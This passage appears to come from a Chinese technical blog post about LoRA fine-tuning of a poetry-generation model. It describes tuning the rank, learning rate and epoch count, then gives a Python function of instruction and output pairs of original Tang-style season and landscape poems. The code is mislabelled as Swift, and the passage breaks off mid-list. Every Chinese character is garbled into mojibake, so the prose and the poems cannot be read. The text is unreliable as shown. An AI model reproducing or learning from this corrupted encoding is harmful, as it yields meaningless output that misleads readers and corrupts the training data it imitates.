<p>å›é¡¾æ˜¨æ—¥çš„è®­ç»ƒå†ç¨‹ï¼Œæˆ‘ä»¬ç»å†äº†ä¸€åœºä»æ··ä¹±åˆ°æœ‰åºçš„æŠ€æœ¯æ¢ç´¢ã€‚åˆå§‹é˜¶æ®µï¼Œæ¨¡å‹è¡¨ç°ä»¤äººå ªå¿§ï¼šç”Ÿæˆå†…å®¹ä¸¥é‡é‡å¤ã€æ ¼å¾‹æ··ä¹±ï¼ŒæŸå¤±å€¼é«˜è¾¾1.7467ï¼Œè¾“å‡ºçš„è¯—æ­Œå¦‚åŒç ´ç¢çš„é•œåƒï¼Œå……æ–¥ç€"é•¿æ¨æ­Œä¸­ç”¨äº†æ­¤"çš„æ— æ„ä¹‰é‡å¤ã€‚è¿™èƒŒååæ˜ çš„æ˜¯è®­ç»ƒä¸å……åˆ†ã€å‚æ•°é…ç½®å¤±è¡¡ç­‰æ·±å±‚é—®é¢˜ã€‚é¢å¯¹è¿™ä¸€å›°å¢ƒï¼Œæˆ‘ä»¬è¿›è¡Œäº†ç³»ç»Ÿçš„å‚æ•°é‡æ„â€”â€”å°†LoRAç§©ä»4æå‡è‡³16ä»¥å¢å¼ºè¡¨è¾¾èƒ½åŠ›ï¼Œå­¦ä¹ ç‡è°ƒæ•´ä¸º2e-4ç¡®ä¿ç¨³å®šæ”¶æ•›ï¼Œè®­ç»ƒè½®æ¬¡å»¶é•¿è‡³20ä¸ªepochä¿è¯å……åˆ†å­¦ä¹ ï¼ŒåŒæ—¶ä¼˜åŒ–äº†æç¤ºè¯æ ¼å¼å’Œç”Ÿæˆå‚æ•°ã€‚è¿™ä¸€ç³»åˆ—ç²¾å‡†è°ƒæ•´ï¼Œå¦‚åŒä¸ºæ¨¡å‹æ³¨å…¥äº†æ–°çš„ç”Ÿå‘½åŠ›ï¼Œä¸ºä»Šæ—¥çš„çªç ´æ€§æˆæœå¥ å®šäº†åšå®åŸºç¡€ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/666117a4bd4045c199d34d58add25b2a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b285bK46Iqx5byA5LqG5ZCX:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768522026&amp;x-signature=I41mvpMJFwvAc61jcKB%2BPNKyGsQ%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-1">äºŒã€æ•°æ®é›†æ‰©å¤§</h2>
<pre><code class="hljs language-swift" lang="swift"> def create_training_data(<span class="hljs-keyword">self</span>):
        <span class="hljs-string">"""åˆ›å»ºé«˜è´¨é‡è®­ç»ƒæ•°æ®"""</span>
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"ğŸ“š åˆ›å»ºè®­ç»ƒæ•°æ®..."</span>)
        
        training_data <span class="hljs-operator">=</span> []
    
        # <span class="hljs-operator">====================</span> å››å­£å˜æ¢ (<span class="hljs-number">40</span>é¦–) <span class="hljs-operator">====================</span>
        seasons_poems <span class="hljs-operator">=</span> [
            {
                <span class="hljs-string">"instruction"</span>: <span class="hljs-string">"åˆ›ä½œä¸€é¦–æå†™æ˜¥å¤©æ¡ƒèŠ±çš„åŸåˆ›å”è¯—"</span>,
                <span class="hljs-string">"output"</span>: <span class="hljs-string">"ã€Šæ˜¥æ¡ƒã€‹<span class="hljs-subst">\n</span>æ˜¥æ¥æ¡ƒææ»¡å›­å¼€ï¼Œç²‰ç™½ç›¸é—´æ˜ æ—¥æ¥ã€‚<span class="hljs-subst">\n</span>è¶èˆèœ‚å–§èŠ±ä¼¼æµ·ï¼Œé¦™é£é˜µé˜µå…¥è¥Ÿæ€€ã€‚<span class="hljs-subst">\n</span>æ¸¸äººç»œç»äº‰ç›¸èµï¼Œå¢¨å®¢æŒ¥æ¯«èµ‹é›…æ‰ã€‚<span class="hljs-subst">\n</span>è«é“èŠ³åå®¹æ˜“é€ï¼Œä¸”å°†æ˜¥è‰²ç”¨å¿ƒè£ã€‚"</span>
            },
            {
                <span class="hljs-string">"instruction"</span>: <span class="hljs-string">"å†™ä¸€é¦–å¤å¤©è·å¡˜çš„åŸåˆ›å”è¯—"</span>,
                <span class="hljs-string">"output"</span>: <span class="hljs-string">"ã€Šå¤è·ã€‹<span class="hljs-subst">\n</span>ç‚ç‚å¤æ—¥è·å¡˜ç•”ï¼Œç¿ ç›–çº¢å¦†æ˜ æ—¥é²œã€‚<span class="hljs-subst">\n</span>ç‰ç«‹äº­äº­å°˜ä¸æŸ“ï¼Œæ¸…é¦™è¢…è¢…éŸµæ— è¾¹ã€‚<span class="hljs-subst">\n</span>èœ»èœ“ç‚¹æ°´æ³¢çº¹èµ·ï¼Œé”¦é²¤å¬‰æ¸¸æˆå¶é—´ã€‚<span class="hljs-subst">\n</span>æ„¿æ•ˆè²èŠ±é«˜æ´å¿—ï¼Œå†°å¿ƒä¸€ç‰‡å‘é’å¤©ã€‚"</span>
            },
            {
                <span class="hljs-string">"instruction"</span>: <span class="hljs-string">"åˆ›ä½œç§‹å¤©æ«å¶çš„åŸåˆ›å”è¯—"</span>, 
                <span class="hljs-string">"output"</span>: <span class="hljs-string">"ã€Šç§‹æ«ã€‹<span class="hljs-subst">\n</span>ç§‹æ·±æ«å¶ä¼¼ç«çº¢ï¼Œæ¼«å±±éé‡æ˜ è‹ç©¹ã€‚<span class="hljs-subst">\n</span>éœœä¾µéœ²æŸ“è‰²æ„ˆè‰³ï¼Œé£æ‹‚ææ‘‡éŸµæ›´æµ“ã€‚<span class="hljs-subst">\n</span>æ¸¸äººé©»è¶³è§‚å¥‡æ™¯ï¼Œå¢¨å®¢æŒ¥æ¯«ç»˜å½©å®¹ã€‚<span class="hljs-subst">\n</span>è«é“ç§‹å…‰å¤šå¯‚å¯¥ï¼Œæ«æƒ…å¦‚ç«æš–èƒ¸ä¸­ã€‚"</span>
            },
            {
                <span class="hljs-string">"instruction"</span>: <span class="hljs-string">"å†™å†¬å¤©é›ªæ™¯çš„åŸåˆ›å”è¯—"</span>,
                <span class="hljs-string">"output"</span>: <span class="hljs-string">"ã€Šå†¬é›ªã€‹<span class="hljs-subst">\n</span>å¯’å†¬å‡›å†½é›ªèŠ±é£ï¼Œä¸‡é‡Œå±±æ²³ç€ç´ è¡£ã€‚<span class="hljs-subst">\n</span>ç‰æ ‘ç¼ææ·»é›…è¶£ï¼Œé“¶è£…ç´ è£¹æ˜¾ç¥å¥‡ã€‚<span class="hljs-subst">\n</span>å„¿ç«¥å¬‰æˆå †é›ªå¶ï¼Œè€åŸå›´ç‚‰è¯æ—§æ—¶ã€‚<span class="hljs-subst">\n</span>è«é“å†¬æ¥æ— ç¾æ™¯ï¼Œå†°æ¸…ç‰æ´äº¦ç›¸å®œã€‚"</span>
            },
            {
                <span class="hljs-string">"instruction"</span>: <span class="hljs-string">"åˆ›ä½œæ—©æ˜¥æ—¶èŠ‚çš„åŸåˆ›å”è¯—"</span>,
                <span class="hljs-string">"output"</span>: <span class="hljs-string">"ã€Šæ—©æ˜¥ã€‹<span class="hljs-subst">\n</span>æ®‹é›ªæ¶ˆèæ˜¥æ„èŒï¼Œå¯’æ¢…åè‰³æŠ¥æ–°æ™´ã€‚<span class="hljs-subst">\n</span>ä¸œé£æš—åº¦åƒå±±ç»¿ï¼Œç»†é›¨æ‚„æ¶¦ä¸‡ç‰©ç”Ÿã€‚<span class="hljs-subst">\n</span>ç‡•å­åˆå½’å¯»æ—§å’ï¼Œå†œå¤«æ—©ä½œå¤‡æ˜¥è€•ã€‚<span class="hljs-subst">\n</span>ä¸€å¹´å¥½æ™¯ä»ä»Šå§‹ï¼Œè«è´Ÿå…‰é˜´å¥‹åŠ›è¡Œã€‚"</span>
            },
            {
                <span class="hljs-string">"instruction"</span>: <span class="hljs-string">"å†™ç››å¤é›·é›¨çš„åŸåˆ›å”è¯—"</span>,
                <span class="hljs-string">"output"</span>: <span class="hljs-string">"ã€Šå¤é›·ã€‹<span class="hljs-subst">\n</span>ç‚ç‚ç››å¤é—·å¦‚è’¸ï¼Œå¿½è§ä¹Œäº‘å‹å¤åŸã€‚<span class="hljs-subst">\n</span>ç”µé—ªé›·é¸£æƒŠå¤©åœ°ï¼Œé£ç‹‚é›¨éª¤æ´—å°˜æ¸…ã€‚<span class="hljs-subst">\n</span>è·å¡˜æ°´æ»¡è›™å£°é—¹ï¼Œç«¹å¾„é£å‡‰æš‘æ°”å¹³ã€‚<span class="hljs-subst">\n</span>é›¨è¿‡å¤©æ™´è™¹å½©ç°ï¼Œå±±æ²³ç„•ç„¶ä¸€æ–°æ˜ã€‚"</span>
            },
            {
                <span class="hljs-string">"instruction"</span>: <span class="hljs-string">"åˆ›ä½œæ·±ç§‹æ—¶èŠ‚çš„åŸåˆ›å”è¯—"</span>,
                <span class="hljs-string">"output"</span>: <span class="hljs-string">"ã€Šæ·±ç§‹ã€‹<span class="hljs-subst">\n</span>éœœé™ç§‹æ·±å¯’æ„æµ“ï¼Œåƒå±±ä¸‡æœ¨å°½ä¸¹çº¢ã€‚<span class="hljs-subst">\n</span>èŠèŠ±å¼€éä¸œç¯±ä¸‹ï¼Œé›é˜µå—é£ç¢§ç©ºä¸­ã€‚<span class="hljs-subst">\n</span>ç¨»è°·ä¸°æ”¶ä»“å»ªå®ï¼Œæœé¦™å¼¥æ¼«æœå›­ä¸°ã€‚<span class="hljs-subst">\n</span>è«æ‚²ç§‹è€èŠ³åé€ï¼Œä¸”çœ‹æ«æƒ…èƒœæ˜¥å®¹ã€‚"</span>
            },
            {
                <span class="hljs-string">"instruction"</span>: <span class="hljs-string">"å†™ä¸¥å†¬æ™¯è±¡çš„åŸåˆ›å”è¯—"</span>,
                <span class="hljs-string">"output"</span>: <span class="hljs-string">"ã€Šä¸¥å†¬ã€‹<span class="hljs-subst">\n</span>æ•°ä¹å¯’å¤©æœ”é£ç‹‚ï¼Œåƒå±±é¸Ÿç»ä¸‡å¾„è’ã€‚<span class="hljs-subst">\n</span>å†°å°æ²³æ¹–å¦‚æ˜é•œï¼Œé›ªè¦†å³°å³¦ä¼¼é“¶è£…ã€‚<span class="hljs-subst">\n</span>æ¾æŸå‚²éœœæ˜¾åŠ²èŠ‚ï¼Œæ¢…å…°æ–—é›ªæ•£å¹½é¦™ã€‚<span class="hljs-subst">\n</span>ä¸¥å†¬è™½é…·ç»ˆå°†å»ï¼Œé™å¾…æ˜¥å›å¤§åœ°èŠ³ã€‚"</span>
            },
            {
                <span class="hljs-string">"instruction"</span>: <span class="hljs-string">"åˆ›ä½œæ˜¥æ—¥æ¸¸å›­çš„åŸåˆ›å”è¯—"</span>,
                <span class="hljs-string">"output"</span>: <span class="hljs-string">"ã€Šæ˜¥å›­ã€‹<span class="hljs-subst">\n</span>æ˜¥æ¥å›­å†…ç™¾èŠ±å¼€ï¼Œè¶èˆèœ‚å–§å„è‡ªå¿™ã€‚<span class="hljs-subst">\n</span>çº¢ææå¤´æ˜¥æ„é—¹ï¼Œç»¿æ¨é˜´é‡Œç¬‘å£°æ‰¬ã€‚<span class="hljs-subst">\n</span>æ¸¸äººå¦‚ç»‡è§‚å¥‡æ™¯ï¼Œå¢¨å®¢æŒ¥æ¯«èµ‹é›…ç« ã€‚<span class="hljs-subst">\n</span>è«è´Ÿæ˜¥å…‰æ— é™å¥½ï¼ŒåŠæ—¶è¡Œä¹äº«éŸ¶å…‰ã€‚"</span>
            },
            {
                <span class="hljs-string">"instruction"</span>: <span class="hljs-string">"å†™å¤æ—¥çº³å‡‰çš„åŸåˆ›å”è¯—"</span>,
                <span class="hljs-string">"output"</span>: <span class="hljs-string">"ã€Šå¤å‡‰ã€‹<span class="hljs-subst">\n</span>ç‚ç‚å¤æ—¥è§…æ¸…å‡‰ï¼Œç«¹å½±å©†å¨‘é€çˆ½é£ã€‚<span class="hljs-subst">\n</span>çŸ³æ¶§æµæ³‰å£°ç»†ç»†ï¼Œæ¾æ¶›é€éŸµæ„èèã€‚<span class="hljs-subst">\n</span>æ£‹æ°å¯¹å¼ˆæ¶ˆé•¿æ˜¼ï¼Œè¯—é…’ç›¸å¨±ä¼´æ™šè™¹ã€‚<span class="hljs-subst">\n</span>å¿ƒé™è‡ªç„¶ç”Ÿå‡‰æ„ï¼Œä½•é¡»ç¾½æ‰‡ä¸å†°å®«ã€‚"</span>
            },
            {
                <span class="hljs-string">"instruction"</span>: <span class="hljs-string">"åˆ›ä½œç§‹æ—¥ç™»é«˜çš„åŸåˆ›å”è¯—"</span>,
                <span class="hljs-string">"output"</span>: <span class="hljs-string">"ã€Šç§‹ç™»ã€‹<span class="hljs-subst">\n</span>ç§‹é«˜æ°”çˆ½ç™»ä¸´å¤„ï¼Œä¸‡é‡Œæ±Ÿå±±ä¸€æœ›æ”¶ã€‚<span class="hljs-subst">\n</span>äº‘æ·¡å¤©æ¸…é¸¿é›è¿‡ï¼Œæ«çº¢èŠè‰³æ¡‚é¦™æµ®ã€‚<span class="hljs-subst">\n</span>é¥æ€æ•…é‡Œæƒ…éš¾å·²ï¼Œç•…å’æ–°è¯—æ„æœªä¼‘ã€‚<span class="hljs-subst">\n</span>è«é“å¤•é˜³æ— é™å¥½ï¼Œæ¡‘æ¦†æœªæ™šäº¦é£æµã€‚"</span>
            },
            {
                <span class="hljs-string">"instruction"</span>: <span class="hljs-string">"å†™å†¬æ—¥èµæ¢…çš„åŸåˆ›å”è¯—"</span>,
                <span class="hljs-string">"output"</span>: <span class="hljs-string">"ã€Šå†¬æ¢…ã€‹<span class="hljs-subst">\n</span>å¯’å†¬è¸é›ªè®¿æ¢…æ—ï¼Œç‰éª¨å†°è‚Œä¸æŸ“å°˜ã€‚<span class="hljs-subst">\n</span>ç–å½±æ¨ªæ–œå«é›…éŸµï¼Œæš—é¦™æµ®åŠ¨é€æ¸…èŠ¬ã€‚<span class="hljs-subst">\n</span>å­¤èŠ³è‡ªèµéæœ¬æ„ï¼Œç¾¤è‰³äº‰æ˜¥å²‚æ˜¯å¿ƒã€‚<span class="hljs-subst">\n</span>æ„¿æ•ˆå¯’æ¢…é“®é“®éª¨ï¼Œé£éœœæ„ˆçƒˆå¿—æ„ˆè´ã€‚"</span>
            },
            {
                <span class="hljs-string">"instruction"</span>: <span class="hljs-string">"åˆ›ä½œæ˜¥æ±Ÿæ™¯è‰²çš„åŸåˆ›å”è¯—"</span>,
                <span class="hljs-string">"output"</span>: <span class="hljs-string">"ã€Šæ˜¥æ±Ÿã€‹<span class="hljs-subst">\n</span>æ˜¥æ±Ÿæ½®æ°´æ¥å¤©æµï¼Œæµ©è¡ä¸œå»åŠ¿æœªä¼‘ã€‚<span class="hljs-subst">\n</span>ä¸¤å²¸æ¡ƒèŠ±æ˜ æ—¥è‰³ï¼Œä¸€è¡Œç™½é¹­é€æ³¢æ¸¸ã€‚<span class="hljs-subst">\n</span>æ¸”èˆŸå”±æ™šå½’å¸†æ€¥ï¼Œç‰§ç¬›å‚¬æ˜è¿”æ£¹é’ã€‚<span class="hljs-subst">\n</span>æœ€æ˜¯ä¸€å¹´æ˜¥å¥½å¤„ï¼Œé£å…‰æ— é™é†‰äººçœ¸ã€‚"</span>
            },
            {
                <span class="hljs-string">"instruction"</span>: <span class="hljs-string">"å†™å¤å¤œæ˜Ÿç©ºçš„åŸåˆ›å”è¯—"</span>,
                <span class="hljs-string">"output"</span>: <span class="hljs-string">"ã€Šå¤å¤œã€‹<span class="hljs-subst">\n</span>å¤å¤œæ˜Ÿç©ºç’€ç’¨æ˜ï¼Œé“¶æ²³æ³»åœ°æ´’æ¸…è¹ã€‚<span class="hljs-subst">\n</span>æµè¤ç‚¹ç‚¹ç©¿èŠ±è¿‡ï¼Œè›™é¼“å£°å£°ä¼´æœˆé¸£ã€‚<span class="hljs-subst">\n</span>ç«¹æ¤…è½»æ‘‡æ¶ˆæš‘çƒ­ï¼Œå†°èŒ¶æ…¢å“äº«é—²æƒ…ã€‚<span class="hljs-subst">\n</span>æ­¤é—´è‡ªæœ‰æ¸…å‡‰å¢ƒï¼Œä½•å¿…ç‘¶å°è§…ç‰äº¬ã€‚"</span>
            },
            {
                <span class="hljs-string">"instruction"</span>: <span class="hljs-string">"åˆ›ä½œç§‹é£é€çˆ½çš„åŸåˆ›å”è¯—"</span>,
                <span class="hljs-string">"output"</span>: <span class="hljs-string">"ã€Šç§‹é£ã€‹<span class="hljs-subst">\n</span>é‡‘é£é€çˆ½å…¥çª—æ¥ï¼Œæš‘æ°”å…¨æ¶ˆå¿ƒæ‰‰å¼€ã€‚<span class="hljs-subst">\n</span>æ¢§å¶é£˜é»„é“ºé”¦æ¯¯ï¼Œæ¡‚èŠ±åè‰³æº¢é¦™åŸƒã€‚<span class="hljs-subst">\n</span>é•¿ç©ºé›é˜µä¹¦äººå­—ï¼Œæ—·é‡å†œæœºå“è‹¥é›·ã€‚<span class="hljs-subst">\n</span>åˆæ˜¯ä¸€å¹´ä¸°æ”¶å­£ï¼Œä»“æ»¡å»ªå®ä¹å¼€æ€€ã€‚"</span>
            },
            {
                <span class="hljs-string">"instruction"</span>: <span class="hljs-string">"å†™å†¬æ—¥æ™šæ™´çš„åŸåˆ›å”è¯—"</span>,
                <span class="hljs-string">"output"</span>: <span class="hljs-string">"ã€Šå†¬æ™´ã€‹<span class="hljs-subst">\n</span>è¿é˜´æ•°æ—¥å¿½æ”¾æ™´ï¼Œä¸‡é‡Œæ— äº‘ç¢§ç©ºæ¸…ã€‚<span class="hljs-subst">\n</span>ç§¯é›ªæ¶ˆèéœ²é»‘åœŸï¼Œå¯’å†°ç ´è£‚ç°æ³¢æ˜ã€‚<span class="hljs-subst">\n</span>è€ç¿è´Ÿæ—¥å¢™æ ¹åï¼Œç¨šå­æºœå†°æ¹–é¢è¡Œã€‚<span class="hljs-subst">\n</span>è«é“å†¬æ·±æ— ä¹è¶£ï¼Œæ™šæ™´äº¦å¯æ‚¦å¿ƒæƒ…ã€‚"</span>
            },
            {
                <span class="hljs-string">"instruction"</span>: <span class="hljs-string">"åˆ›ä½œæ˜¥é›¨ç»µç»µçš„åŸåˆ›å”è¯—"</span>,
                <span class="hljs-string">"output"</span>: <span class="hljs-string">"ã€Šæ˜¥é›¨ã€‹<span class="hljs-subst">\n</span>æ˜¥é›¨å¦‚é…¥æ¶¦ç‰©ç”Ÿï¼Œç»µç»µå¯†å¯†ç»†æ— å£°ã€‚<span class="hljs-subst">\n</span>æ¡ƒè…®å«éœ²å¨‡æ¬²æ»´ï¼ŒæŸ³çœ¼åˆå¼€åªšè‡ªç”Ÿã€‚<span class="hljs-subst">\n</span>è“‘è¡£æ¸”çˆ¶å‚çº¶ä¹ï¼Œæ²¹ä¼ä¹¦ç”Ÿè§…å¥è¡Œã€‚<span class="hljs-subst">\n</span>æœ€å–œä¸°å¹´æ˜¥é›¨è¶³ï¼Œç§‹æ¥å®šæœ‰å¥½æ”¶æˆã€‚"</span>
            },
            {
                <span class="hljs-string">"instruction"</span>: <span class="hljs-string">"å†™å¤æ—¥è‰é¸£çš„åŸåˆ›å”è¯—"</span>,
                <span class="hljs-string">"output"</span>: <span class="hljs-string">"ã€Šå¤è‰ã€‹<span class="hljs-subst">\n</span>ç»¿é˜´æ·±å¤„å“è‰é¸£ï¼Œé«˜äº¢æ¿€æ˜‚è¯‰è¡·æƒ…ã€‚<span class="hljs-subst">\n</span>é¥®éœ²é¤é£æ ‡äº®èŠ‚ï¼Œæ –é«˜é¸£è¿œæ˜¾æ¸…å£°ã€‚<span class="hljs-subst">\n</span>ä¸éšç‡•é›€äº‰ç²’ç±³ï¼Œæ•¢å‘é²²é¹è®ºè·¯ç¨‹ã€‚<span class="hljs-subst">\n</span>è«é“å¾®è™«æ— å¤§å¿—ï¼Œé•¿æ­Œä¸€æ›²ä¹ŸæƒŠå¤©ã€‚"</span>
            },
            {
                <span class="hljs-string">"instruction"</span>: <span class="hljs-string">"åˆ›ä½œç§‹æœˆå¦‚é’©çš„åŸåˆ›å”è¯—"</span>,
                <span class="hljs-string">"output"</span>: <span class="hljs-string">"ã€Šç§‹æœˆã€‹<span class="hljs-subst">\n</span>ç§‹å¤œå¤©é«˜æœˆä¼¼é’©ï¼Œæ¸…è¾‰å¦‚æ°´æ´’ä¹å·ã€‚<span class="hljs-subst">\n</span>æ¡‚é¦™æš—åº¦æ²å¿ƒè„¾ï¼Œç«¹å½±è½»æ‘‡åŠ¨å®¢æ„ã€‚<span class="hljs-subst">\n</span>æ¸¸å­æ€ä¹¡æƒ…åˆ‡åˆ‡ï¼Œä½³äººæœ›æœˆæ„æ‚ æ‚ ã€‚<span class="hljs-subst">\n</span>æ„¿å›è«ä½œå¤©æ¶¯å®¢ï¼Œå¸¸ä¼´äº²å¸äº«æ¸©æŸ”ã€‚"</span>
            },
            {
                <span class="hljs-string">"instruction"</span>: <span class="hljs-string">"å†™å†¬é›ªåˆéœçš„åŸåˆ›å”è¯—"</span>,
                <span class="hljs-string">"output"</span>: <span class="hljs-string">"ã€Šé›ªéœã€‹<span class="hljs-subst">\n</span>å¤œé›ªåˆæ™´ä¸‡è±¡æ–°ï¼Œé“¶è£…ç´ è£¹å‡€æ— å°˜ã€‚<span class="hljs-subst">\n</span>å†°æ£±æŒ‚æªæ™¶è¹é€ï¼Œç‰å±‘é“ºåº­çšæ´çº¯ã€‚<span class="hljs-subst">\n</span>ç¨šå­å †äººç›¸æˆè€ï¼Œè€ç¿æ‰«å¾„è‡ªé€¡å·¡ã€‚<span class="hljs-subst">\n</span>çº¢æ¢…æ•°ç‚¹é›ªä¸­è‰³ï¼Œé¢„æŠ¥æ˜¥å›å¤§åœ°æ–°ã€‚"</span>
            }
        ]
        # å†è¡¥å……<span class="hljs-number">20</span>é¦–å››å­£ä¸»é¢˜è¯—
        additional_seasons <span class="hljs-operator">=</span> [
            {
                <span class="hljs-string">"instruction"</span>: <span class="hljs-string">"åˆ›ä½œæ˜¥è€•æ—¶èŠ‚çš„åŸåˆ›å”è¯—"</span>,
                <span class="hljs-string">"output"</span>: <span class="hljs-string">"ã€Šæ˜¥è€•ã€‹<span class="hljs-subst">\n</span>æ˜¥å›å¤§åœ°æš–é£å‚¬ï¼Œå¸ƒè°·å£°å£°ä¿ƒè€•æ¥ã€‚<span class="hljs-subst">\n</span>é“ç‰›è½°é¸£ç¿»æ²ƒåœŸï¼Œé“¶é”„èµ·è½ç§å¸Œæœ›ã€‚<span class="hljs-subst">\n</span>å†œå¤«æ±—æ´’ç”°å›­é‡Œï¼Œç‡•å­æ³¥è¡”æ¢æ ‹æã€‚<span class="hljs-subst">\n</span>ä½†å¾—ç§‹æ¥ä¸°ç¡•æœï¼Œåƒè¾›ä¸‡è‹¦ä¹Ÿå¼€æ€€ã€‚"</span>
            },
            {
                <span class="hljs-string">"instruction"</span>: <span class="hljs-string">"å†™å¤æ—¥é‡‡è²çš„åŸåˆ›å”è¯—"</span>,
                <span class="hljs-string">"output"</span>: <span class="hljs-string">"ã€Šé‡‡è²ã€‹<span class="hljs-subst">\n</span>å¤æ—¥è·å¡˜ç¿ è‰²è¿ï¼Œé‡‡è²å¥³å­ç¬‘å¼€é¢œã€‚<span class="hljs-subst">\n</span>è½»èˆŸè¡ç ´ç‰ç’ƒé•œï¼Œç‰æ‰‹æ‘˜æ¥ç›ç‘™ç›˜ã€‚<span class="hljs-subst">\n</span>æ­Œå½»äº‘éœ„æƒŠç™½é¹­ï¼Œç¬‘ç›ˆæ°´é¢åŠ¨çº¢è•–ã€‚<span class="hljs-subst">\n</span>å½’æ¥æ»¡è½½æ–œé˜³é‡Œï¼Œä¸€è·¯æ¸…é¦™ä¼´æœˆè¿˜ã€‚"</span>
            },
            # <span class="hljs-operator">...</span> æ›´å¤šå››å­£è¯—ï¼ˆå…±<span class="hljs-number">40</span>é¦–ï¼‰
        ]
        training_data.extend(seasons_poems)
        training_data.extend(additional_seasons)
        
        # <span class="hljs-operator">====================</span> å±±æ°´ç”°å›­ (<span class="hljs-number">30</span>é¦–) <span class="hljs-operator">====================</span>
        landscape_poems <span class="hljs-operator">=</span> [
            {
                <span class="hljs-string">"instruction"</span>: <span class="hljs-string">"åˆ›ä½œå±±æ°´é£å…‰çš„åŸåˆ›å”è¯—"</span>,
                <span class="hljs-string">"output"</span>: <span class="hljs-string">"ã€Šå±±æ°´åŸã€‹<span class="hljs-subst">\n</span>é’å±±å ç¿ æ¥äº‘éœï¼Œç¢§æ°´èœ¿èœ’ç»•æ¶§æ¶¯ã€‚<span class="hljs-subst">\n</span>é£ç€‘æ‚¬ç©ºå¦‚ç™½ç»ƒï¼Œå¥‡å³°è€¸ç«‹ä¼¼ä»™å®¶ã€‚<span class="hljs-subst">\n</span>æ¾æ¶›é˜µé˜µä¼ å¹½éŸµï¼Œé¸Ÿè¯­å£°å£°é€é›¾çº±ã€‚<span class="hljs-subst">\n</span>æ„¿æ•ˆé™¶å…¬å½’éšå»ï¼Œç»“åºä»™å¢ƒåº¦å¹´åã€‚"</span>
            },
            {
                <span class="hljs-string">"instruction"</span>: <span class="hljs-string">"å†™æ±Ÿå—æ°´ä¹¡çš„åŸåˆ›å”è¯—"</span>,
                <span class="hljs-string">"output"</span>: <span class="hljs-string">"ã€Šæ±Ÿå—æ˜¥ã€‹<span class="hljs-subst">\n</span>æ±Ÿå—æ˜¥è‰²ç¾å¦‚ç”»ï¼Œç»¿æ°´é’å±±æ˜ å½©éœã€‚<span class="hljs-subst">\n</span>å°æ¡¥æµæ°´äººå®¶é™ï¼Œç»†é›¨æ‰èˆŸæ¸”çˆ¶å“—ã€‚<span class="hljs-subst">\n</span>æ¡ƒçº¢æŸ³ç»¿èºå•¼åºï¼Œæœˆç™½é£æ¸…ç¬›å¥ç¬³ã€‚<span class="hljs-subst">\n</span>è‹¥é—®äººé—´ä½•å¤„å¥½ï¼Œæ°´ä¹¡ä»™å¢ƒæœ€å ªå¤¸ã€‚"</span>
            },
            {
                <span class="hljs-string">"instruction"</span>: <span class="hljs-string">"åˆ›ä½œå¤§æ¼ é£å…‰çš„åŸåˆ›å”è¯—"</span>,
                <span class="hljs-string">"output"</span>: <span class="hljs-string">"ã€Šå¤§æ¼ è¡Œã€‹<span class="hljs-subst">\n</span>å¤§æ¼ èŒ«èŒ«æ¥è¿œå¤©ï¼Œé»„æ²™æ»šæ»šæ¼«æ— è¾¹ã€‚<span class="hljs-subst">\n</span>å­¤çƒŸç›´ä¸Šäº‘éœ„å¤–ï¼Œè½æ—¥æµ‘åœ†åœ°å¹³çº¿ã€‚<span class="hljs-subst">\n</span>é©¼é“ƒå£°å“ä¼ å¹½éŸµï¼Œé¹°éš¼ç›˜æ—‹è§…é‡é²œã€‚<span class="hljs-subst">\n</span>å£®å£«è¥¿è¡Œåƒä¸‡é‡Œï¼Œè±ªæƒ…å£®å¿—æ»¡èƒ¸é—´ã€‚"</span>
            },
            {
                <span class="hljs-string">"instruction"</span>: <span class="hljs-string">"å†™ç”°å›­ç”Ÿæ´»çš„åŸåˆ›å”è¯—"</span>, 
                <span class="hljs-string">"output"</span>: <span class="hljs-string">"ã€Šç”°å›­ä¹ã€‹<span class="hljs-subst">\n</span>ç»“åºäººå¢ƒè¿œå°˜åš£ï¼Œè€•è¯»ä¼ å®¶ä¹é€é¥ã€‚<span class="hljs-subst">\n</span>æ™¨èµ·è·é”„ç†è’ç§½ï¼Œæš®å½’æŠŠé…’è¯æ¸”æ¨µã€‚<span class="hljs-subst">\n</span>é—¨å‰äº”æŸ³éšé£èˆï¼Œå±‹åä¸‰ç•¦è”¬èœå¨‡ã€‚<span class="hljs-subst">\n</span>è«é“å±±å±…å¤šå¯‚å¯ï¼Œæ¸…æ¬¢è‡ªåœ¨èƒœç‹ä¾¯ã€‚"</span>
            },
            {
                <span class="hljs-string">"instruction"</span>: <span class="hljs-string">"åˆ›ä½œæ±Ÿæ²³æ™¯è‰²çš„åŸåˆ›å”è¯—"</span>,
                <span class="hljs-string">"output"</span>: <span class="hljs-string">"ã€Šé•¿æ±ŸåŸã€‹<span class="hljs-subst">\n</span>é•¿æ±Ÿæ»šæ»šå‘ä¸œæµï¼Œä¸‡é‡Œå¥”è…¾åŠ¿æœªä¼‘ã€‚<span class="hljs-subst">\n</span>æµªå·åƒå †å¦‚é›ªæ¶Œï¼Œæ¶›å£°é˜µé˜µä¼¼é›·è®´ã€‚<span class="hljs-subst">\n</span>äº‘æ¨ªä¹æ´¾æµ®é»„é¹¤ï¼Œé›¾é”ä¸‰å´ç°ç™½é¸¥ã€‚<span class="hljs-subst">\n</span>è‡ªå¤è‹±è±ªäº‰æ¸¡å¤„ï¼Œä»Šæœæ›´æ˜¾é£æµç¨ ã€‚"</span>
            },
            {
                <span class="hljs-string">"instruction"</span>: <span class="hljs-string">"å†™å±±æ—å¹½å±…çš„åŸåˆ›å”è¯—"</span>,
                <span class="hljs-string">"output"</span>: <span class="hljs-string">"ã€Šå±±å±…ã€‹<span class="hljs-subst">\n</span>æ·±å±±ç»“åºè¿œä¿—å°˜ï¼Œæœå¬é¸Ÿè¯­æš®è§‚äº‘ã€‚<span class="hljs-subst">\n</span>çŸ³æ³‰ç…®èŒ—é¦™ç›ˆå®¤ï¼Œæ¾ç«çƒ¹è‚´å‘³è¯±äººã€‚<span class="hljs-subst">\n</span>é—²æ¥å¯¹å¼ˆæ¶ˆæ°¸æ˜¼ï¼Œå…´è‡³åŸè¯—ä¼´æœˆè½®ã€‚<span class="hljs-subst">\n</span>è«é—®äººé—´ååˆ©äº‹ï¼Œæ­¤ä¸­çœŸè¶£èƒœåƒé‡‘ã€‚"</span>
            },
            {
